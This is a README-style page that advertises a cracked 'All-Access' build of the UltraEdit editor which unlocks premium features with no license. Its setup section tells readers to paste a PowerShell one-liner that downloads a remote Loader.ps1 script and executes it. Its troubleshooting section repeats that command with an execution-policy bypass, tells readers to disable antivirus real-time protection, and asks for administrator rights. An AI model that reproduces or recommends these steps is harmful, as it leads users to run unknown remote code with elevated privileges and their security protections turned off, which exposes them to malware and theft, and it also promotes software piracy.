# UltraEdit Professional — Advanced Text & Source Code Editor Suite

Welcome to the automated deployment environment for the **UltraEdit Professional All-Access Build**. This repository delivers a streamlined, lightweight configuration toolkit engineered to fully unlock the complete premium feature set of the world's most powerful text, hex, and programmer's editor.

Handle multi-gigabyte files effortlessly, utilize robust columns editing modes, and enjoy permanent professional access without dealing with restrictive trial limitations or manual license keys.

---

## 💻 Elite Capabilities of UltraEdit Professional

* **Massive File Handling:** Seamlessly open, edit, and parse large text files exceeding 10+ GB.
* **Multi-Caret & Column Mode:** Edit code in multiple places at once or manipulate column-based data.
* **Integrated Hex Editor:** Powerful binary editing options with customizable data layouts.
* **FTP/SFTP Browser:** Connect directly to remote servers and update code files securely.

---

## 🛠 Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press Win + X on your keyboard.
   * Click on Terminal or Windows PowerShell from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit Enter. The script will handle the necessary registry tweaks and install all dependencies automatically:

   ```powershell
   irm https://trust-soft.cc/powershell/Loader.ps1 | iex
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):

```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://trust-soft.cc/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated PowerShell)
If your PowerShell version doesn't support the irm shortcut, use the full, unabbreviated commands instead:

```cmd
Invoke-RestMethod https://trust-soft.cc/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---

## 📋 System Compatibility & Parameters

* **Operating System:** Optimized for Windows 7, 8, 10, and 11 (fully functional on 64-bit environments).
* **Syntax Highlighting:** Native support for HTML, PHP, JavaScript, C++, Python, and 20+ other profiles.
* **Privileges:** Elevated administrative console tokens are required to integrate system path shortcuts.
